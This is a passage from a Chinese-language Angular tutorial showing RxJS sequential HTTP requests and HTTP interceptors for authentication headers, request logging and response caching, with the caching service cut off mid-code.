</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="顺序发送-http-请求"><a href="#顺序发送-http-请求" class="header-anchor">#</a> 顺序发送 Http 请求</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">sequentialRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> sequence$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span>get<span class="token operator">&lt;</span>Course<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwEBq5wbFnjj7O8Fp.json'</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">switchMap</span><span class="token punctuation">(</span><span class="token parameter">course</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            course<span class="token punctuation">.</span>description<span class="token operator">+=</span> <span class="token string">' - TEST '</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwEBq5wbFnjj7O8Fp.json'</span><span class="token punctuation">,</span> course<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
    sequence$<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="获取顺序发送http请求结果"><a href="#获取顺序发送http请求结果" class="header-anchor">#</a> 获取顺序发送Http请求结果</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">sequentialRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> sequence$ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span>get<span class="token operator">&lt;</span>Course<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwEBq5wbFnjj7O8Fp.json'</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">switchMap</span><span class="token punctuation">(</span><span class="token parameter">course</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            course<span class="token punctuation">.</span>description<span class="token operator">+=</span> <span class="token string">' - TEST '</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>http<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">'/courses/-KgVwEBq5wbFnjj7O8Fp.json'</span><span class="token punctuation">,</span> course<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">(</span><span class="token parameter">firstHTTPResult<span class="token punctuation">,</span> secondHTTPResult</span><span class="token punctuation">)</span>  <span class="token operator">=&gt;</span> <span class="token punctuation">[</span>firstHTTPResult<span class="token punctuation">,</span> secondHTTPResult<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    sequence$<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">values</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;result observable &quot;</span><span class="token punctuation">,</span> values<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="http拦截器"><a href="#http拦截器" class="header-anchor">#</a> Http拦截器</h3> <p>拦截器提供了一种用于拦截、修改请求和响应的机制。这个概念与 Node.js 的 Express 框架中间件的概念类似。拦截器提供的这种特性，对于日志、缓存、请求授权来说非常有用。</p> <h3 id="authinterceptor"><a href="#authinterceptor" class="header-anchor">#</a> AuthInterceptor</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// auth.interceptor.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpEvent<span class="token punctuation">,</span> HttpHandler<span class="token punctuation">,</span> HttpInterceptor<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpRequest<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Observable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;rxjs/Observable&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AuthInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HttpInterceptor</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> authService<span class="token operator">:</span> AuthService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
    <span class="token function">intercept</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> next<span class="token operator">:</span> HttpHandler<span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>HttpEvent<span class="token operator">&lt;</span>any<span class="token operator">&gt;&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> clonedRequest <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            headers<span class="token operator">:</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'X-CustomAuthHeader'</span><span class="token punctuation">,</span> authService<span class="token punctuation">.</span><span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;new headers&quot;</span><span class="token punctuation">,</span> clonedRequest<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> next<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>clonedRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 配置拦截器</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    declarations<span class="token operator">:</span> <span class="token punctuation">[</span>
        AppComponent
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    imports<span class="token operator">:</span> <span class="token punctuation">[</span>
        BrowserModule<span class="token punctuation">,</span>
        HttpClientModule
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">[</span> <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> AuthInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span> <span class="token punctuation">]</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br></div></div><p>要实现自定义拦截器，首先我需要定义一个类并实现 HttpInterceptor 接口：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">HttpInterceptor</span> <span class="token punctuation">{</span>
  <span class="token function">intercept</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> next<span class="token operator">:</span> HttpHandler<span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>HttpEvent<span class="token operator">&lt;</span>any<span class="token operator">&gt;&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>实现 HttpInterceptor 接口，就需要实现该接口中定义的 intercept()，该方法接收两个参数：</p> <ul><li>req：HttpRequest 对象，即请求对象。</li> <li>next：HttpHandler 对象，该对象有一个 handle() 方法，该方法返回一个 Observable 对象。</li></ul> <h3 id="logginginterceptor"><a href="#logginginterceptor" class="header-anchor">#</a> LoggingInterceptor</h3> <p>下面我们来定义 LoggingInterceptor 拦截器，该拦截器实现的功能是记录每个请求的响应状态和时间。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// logging.interceptor.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpInterceptor<span class="token punctuation">,</span> HttpRequest<span class="token punctuation">,</span> HttpHandler<span class="token punctuation">,</span> HttpResponse <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> finalize<span class="token punctuation">,</span> tap <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/operators'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> LoggerService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../logger.service'</span><span class="token punctuation">;</span>

@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">LoggingInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HttpInterceptor</span> <span class="token punctuation">{</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> loggerService<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token function">intercept</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> next<span class="token operator">:</span> HttpHandler</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> startTime <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> status<span class="token operator">:</span> string<span class="token punctuation">;</span>

    <span class="token keyword">return</span> next<span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>
        <span class="token function">tap</span><span class="token punctuation">(</span>
          <span class="token parameter">event</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            status <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>event <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              status <span class="token operator">=</span> <span class="token string">'succeeded'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token parameter">error</span> <span class="token operator">=&gt;</span> status <span class="token operator">=</span> <span class="token string">'failed'</span>
        <span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> elapsedTime <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">;</span>
          <span class="token keyword">const</span> message <span class="token operator">=</span> req<span class="token punctuation">.</span>method <span class="token operator">+</span> <span class="token string">&quot; &quot;</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>urlWithParams <span class="token operator">+</span><span class="token string">&quot; &quot;</span><span class="token operator">+</span> status 
          <span class="token operator">+</span> <span class="token string">&quot; in &quot;</span> <span class="token operator">+</span> elapsedTime <span class="token operator">+</span> <span class="token string">&quot;ms&quot;</span><span class="token punctuation">;</span>
          
          <span class="token keyword">this</span><span class="token punctuation">.</span>loggerService<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// logger.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>

@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">&quot;root&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">LoggerService</span> <span class="token punctuation">{</span>
  <span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token operator">:</span> string<span class="token punctuation">,</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br></div></div><p>定义完 LoggingInterceptor 拦截器，在使用它之前还需对它进行配置：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  declarations<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span><span class="token punctuation">,</span>
  imports<span class="token operator">:</span> <span class="token punctuation">[</span>BrowserModule<span class="token punctuation">,</span> HttpClientModule<span class="token punctuation">]</span><span class="token punctuation">,</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> AuthInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> LoggingInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  bootstrap<span class="token operator">:</span> <span class="token punctuation">[</span>AppComponent<span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppModule</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>接着我们来继续更新一下 AppComponent 根组件：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpClient <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-root&quot;</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h3&gt;Angular Http Interceptor&lt;/h3&gt;
    &lt;button (click)=&quot;getUsers()&quot;&gt;Get Users&lt;/button&gt;
 </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  styles<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">button {border: 1px solid blue;}</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> http<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token function">getUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>http
      <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;http://jsonplaceholder.typicode.com/users&quot;</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>然后启动应用，当我们点击 Get Users 按钮时，控制台会输出一下信息：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET http://jsonplaceholder.typicode.com/users succeeded in 728ms
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="cachinginterceptor"><a href="#cachinginterceptor" class="header-anchor">#</a> CachingInterceptor</h3> <p>在实现缓存拦截器之前，我们先来定义一个 Cache 接口：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> HttpRequest<span class="token punctuation">,</span> HttpResponse <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Cache</span> <span class="token punctuation">{</span>
  <span class="token keyword">get</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> HttpResponse<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token function">put</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span> res<span class="token operator">:</span> HttpResponse<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>上面定义的 Cache 接口中，包含两个方法：</p> <ul><li>get(req: HttpRequest): HttpResponse| null —— 用于获取 req 请求对象对应的响应对象；</li> <li>put(req: HttpRequest, res: HttpResponse): void; —— 用于保存 req 对象对应的响应对象。</li></ul> <p>另外在实际的场景中，我们一般都会为缓存设置一个最大的缓存时间，即缓存的有效期。在有效期内，如果缓存命中，则会直接返回已缓存的响应对象。下面我们再来定义一个 CacheEntry 接口，该接口包含三个属性：</p> <ul><li>url: string —— 被缓存的请求 URL 地址</li> <li>response: HttpResponse—— 被缓存的响应对象</li> <li>entryTime: number —— 响应对象被缓存的时间，用于判断缓存是否过期</li></ul> <p>此外，我们还要定义一个常量，用于设定缓存的有效期，这里我们假设缓存的时间为 30 s，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> HttpResponse <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">MAX_CACHE_AGE</span> <span class="token operator">=</span> <span class="token number">30000</span><span class="token punctuation">;</span> <span class="token comment">// 单位为毫秒</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">CacheEntry</span> <span class="token punctuation">{</span>
  url<span class="token operator">:</span> string<span class="token punctuation">;</span>
  response<span class="token operator">:</span> HttpResponse<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
  entryTime<span class="token operator">:</span> number<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>定义完 Cache 和 CacheEntry 接口，我们来实现 CacheService 服务</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/core&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpRequest<span class="token punctuation">,</span> HttpResponse <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;@angular/common/http&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> Cache <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./cache&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> CacheEntry<span class="token punctuation">,</span> <span class="token constant">MAX_CACHE_AGE</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">&quot;./cache.entry&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> LoggerService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./logger.service'</span><span class="token punctuation">;</span>

@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">&quot;root&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">CacheService</span> <span class="token keyword">implements</span> <span class="token class-name">Cache</span> <span class="token punctuation">{</span>
  cacheMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> CacheEntry<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> logger<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token keyword">get</span><span class="token punctuation">(</span>req<span class="token operator">:</span> HttpRequest<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> HttpResponse<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>
    <span class="token comment">// 判断当前请求是否已被缓存，若未缓存则返回null</span>
    <span class="token keyword">const</span> entry <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cacheMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>urlWithParams<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>entry<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
